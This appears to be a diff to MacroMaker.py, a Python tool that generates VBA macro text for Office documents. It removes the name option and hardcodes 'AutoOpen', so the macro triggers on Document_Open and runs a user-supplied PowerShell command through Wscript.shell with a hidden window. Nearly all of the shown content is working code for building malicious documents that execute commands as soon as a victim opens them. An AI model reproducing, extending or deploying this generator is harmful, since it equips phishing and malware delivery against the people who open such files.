@@ -9,12 +9,12 @@ class  Maker_Code:
            self.control()
            self.MAKE_DO()
        def  MAKE_DO(self):
-            if self.args.Command and self.args.Name and not self.args.read:
+            if self.args.Command  and not self.args.read:
                    pass
-            elif self.args.read and self.args.Name and not self.args.Command:
+            elif self.args.read and not self.args.Command:
                    pass
             else:
-                 print("\n[+] usage: MacroMaker.py [-h] -c C -n NAME")
+                 print("\n[+] usage: MacroMaker.py [-h] -c C ")
                  print("[+] MacroMaker.py: error: the following arguments are required")
                  print("[+] use -C/--Command or -r/--read")
                  print("[+] use -h to see help options")
@@ -32,20 +32,19 @@ class  Maker_Code:
             for i in range(0,len(Command),String_len):
                 Commandloop = "Str= str+" + '"' + Command[i:i+String_len] +'"'+'\n'
                 Do +='\t'+Commandloop
-            with open (self.args.Name+".txt",'w') as Macro_File :
-                        Micro_write = Macro_File.write("Sub "+self.args.Name+"()"+'\n'+"'\n'\n"\
-                        +self.args.Name+"Macro"+"\n'\n'\n"+"End Sub"+'\n'+"Sub Document_Open()"\
-                        +'\n'+"    "+self.args.Name+"Macro"+'\n'+"End Sub"+'\n'+"Sub "+self.args.Name+"Macro()\n"\
+            with open ("AutoOpen"+".txt",'w') as Macro_File :
+                        Micro_write = Macro_File.write("Sub "+"AutoOpen"+"()"+'\n'+"'\n'\n"\
+                        +"AutoOpen"+"Macro"+"\n'\n'\n"+"End Sub"+'\n'+"Sub Document_Open()"\
+                        +'\n'+"    "+"AutoOpen"+"Macro"+'\n'+"End Sub"+'\n'+"Sub "+"AutoOpen"+"Macro()\n"\
                         +"\tDim Str As String\n"+f'{Do}'+'\n'\
                         +'\tCreateObject("Wscript.shell").Run Str , 0, True \n'+"End Sub\n"
                        )
-            with open (self.args.Name+".txt",'r') as Macro_File : 
+            with open ("AutoOpen"+".txt",'r') as Macro_File : 
                        Macro_read =  Macro_File.read()
             print(Macro_read)
        def control(self):    
          parser = argparse.ArgumentParser(description="Usage: [OPtion] [arguments] [ -n ] [arguments]")       
          parser.add_argument( "-c","--Command",help ="PowerShell Command ") 
-         parser.add_argument( "-n","--Name"   ,help ="Name of the Macto")  
          parser.add_argument( "-r","--read"   ,help ="Name of the Macto")     
          self.args = parser.parse_args()        
          if len(sys.argv)!=1 :
